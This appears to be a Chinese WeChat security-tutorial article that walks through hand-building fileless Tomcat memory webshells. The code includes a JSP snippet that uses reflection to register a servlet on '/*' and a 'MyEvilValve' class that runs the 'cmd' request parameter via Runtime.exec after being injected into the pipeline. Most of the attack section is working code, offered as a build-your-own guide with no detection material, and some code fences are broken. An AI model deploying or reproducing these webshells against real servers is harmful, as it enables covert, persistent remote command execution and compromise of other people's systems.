---
title: 第113天-Java攻防｜揭秘内存马：手搓代码实现Tomcat隐身术
url: https://mp.weixin.qq.com/s/e0AkJ6aBIGbWXr9PoPQv_Q
source: Doonsec's feed
date: 2026-03-28
fetch_date: 2026-03-29T04:37:30.466647
---

# 第113天-Java攻防｜揭秘内存马：手搓代码实现Tomcat隐身术

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/Byhdgj3e9qsJ9p0iby7EibL650icMLV8kFj9Az5kH2ms2ib2OTA9Sic0f5Xom0CFCOqmw3KuMQfWvU2wT3AYLxvibb65RrFqBiaQJ4bbXzqsVddY3A/0?wx_fmt=jpeg)

# 第113天-Java攻防｜揭秘内存马：手搓代码实现Tomcat隐身术

原创

Сяо Яо
Сяо Яо

AlphaNet

![]()

在小说阅读器中沉浸阅读

朋友们好！👋 在网络攻防的世界里，有一种技术如同“隐形刺客”，它不落地、无文件，悄无声息地潜伏在服务器的内存中，执行着攻击者的指令。它，就是**内存马**（Memory-resident Webshell）。

想不想知道这个“刺客”是如何诞生的？想不想亲手打造一个属于自己的内存马，深入理解其背后的原理？

今天，就让我们一起化身代码工匠，从零开始，手搓两种经典的 Tomcat 内存马——**Servlet 型**和 **Valve 型**，彻底征服这项高级攻防技术！💪

---

### 📜 Part 1：Servlet 内存马——“伪装的”服务员

#### 🤔 是什么：Servlet 与内存马

首先，我们来了解一下 Servlet 是什么。简单来说，Servlet 是 Java 提供的一种服务器端小程序。当你在浏览器地址栏输入一个网址（如 `/demo`）时，Tomcat 服务器就会找到处理这个地址的 Servlet，让它来为你服务。

而 **Servlet 内存马**，就是利用 Java 的反射机制，在不修改任何配置文件（如 `web.xml`）的情况下，**动态地向服务器注册一个新的、恶意的 Servlet**。

---

#### 🧐 为什么：动态注册的魔力

```
<servlet>
    <servlet-name>servletDemo</servlet-name>
    <servlet-class>com.test.servletDemo</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>servletDemo</servlet-name>
    <url-pattern>/demo</url-pattern>
</servlet-mapping>
```

---

#### 🛠️ 怎么做：三步实现 Servlet 内存马

```
<dependency>
    <groupId>org.apache.tomcat</groupId>
    <artifactId>tomcat-catalina</artifactId>
    <version>9.0.68</version>
</dependency>
```

```
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    org.apache.catalina.connector.Request req =
        (org.apache.catalina.connector.Request) reqF.get(request);

```
org.apache.catalina.core.StandardContext context =
    (org.apache.catalina.core.StandardContext) req.getContext();

org.apache.catalina.Wrapper wrapper = context.createWrapper();
wrapper.setName("testservlet");
wrapper.setServletClass(HelloServlet.class.getName());
wrapper.setServlet(new HelloServlet());

context.addChild(wrapper);
context.addServletMappingDecoded("/*", "testservlet");
```

%>
```

---

### 🌊 Part 2：Valve 内存马——“安插的”阀门

#### 🛠️ 恶意 Valve 类

```
import org.apache.catalina.valves.ValveBase;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import javax.servlet.ServletException;
import java.io.IOException;

public class MyEvilValve extends ValveBase {
@Override
public void invoke(Request request, Response response)
throws IOException, ServletException {

```
    String cmd = request.getParameter("cmd");

    if (cmd != null && !cmd.isEmpty()) {
        java.io.PrintWriter writer = response.getWriter();
        writer.println("Executing command: " + cmd);

        java.lang.Runtime.getRuntime().exec(cmd);
        return;
    }

    getNext().invoke(request, response);
}
```

}
```

---

#### 🛠️ 注入 Valve

```
<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);

```
org.apache.catalina.connector.Request req =
    (org.apache.catalina.connector.Request) reqF.get(request);

org.apache.catalina.core.StandardContext context =
    (org.apache.catalina.core.StandardContext) req.getContext();

org.apache.catalina.Pipeline pipeline = context.getPipeline();

MyEvilValve evilValve = new MyEvilValve();
pipeline.addValve(evilValve);
```

%>
```

---

###

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/Byhdgj3e9quk3H3M941l5byeiaCLHfZUhoIib5xPSPc8ddSdEOynSxIhaaiaIxwJImQia7wqHZPUerghtNSnbEj87A80CvEm0bGia8Is4qGerIvc/0?wx_fmt=png)

AlphaNet

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/Byhdgj3e9quk3H3M941l5byeiaCLHfZUhoIib5xPSPc8ddSdEOynSxIhaaiaIxwJImQia7wqHZPUerghtNSnbEj87A80CvEm0bGia8Is4qGerIvc/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过